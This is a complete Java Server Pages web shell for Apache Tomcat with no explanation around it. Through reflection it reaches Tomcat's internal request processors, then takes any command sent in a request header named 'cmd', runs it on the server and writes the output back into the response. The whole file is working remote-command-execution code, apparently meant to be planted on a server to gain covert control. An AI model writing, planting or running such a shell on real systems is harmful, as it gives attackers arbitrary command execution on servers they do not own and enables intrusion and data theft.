<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Object obj = Thread.currentThread();
    java.lang.reflect.Field field = obj.getClass().getDeclaredField("target");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("this$0");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("handler");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("global");
    field.setAccessible(true);
    obj = field.get(obj);

    field = obj.getClass().getDeclaredField("processors");
    field.setAccessible(true);
    obj = field.get(obj);


    java.util.List processors = (java.util.List) obj;
    for (Object o : processors) {
        field = o.getClass().getDeclaredField("req");
        field.setAccessible(true);
        obj = field.get(o);
        org.apache.coyote.Request req = (org.apache.coyote.Request) obj;

        String cmd = req.getHeader("cmd");
        if (cmd != null) {
            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            java.io.InputStreamReader isr = new java.io.InputStreamReader(in);
            java.io.BufferedReader br = new java.io.BufferedReader(isr);

            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }

            org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();
            bc.setBytes(sb.toString().getBytes(), 0, sb.toString().getBytes().length);
            req.getResponse().doWrite(bc);
        }
    }
%>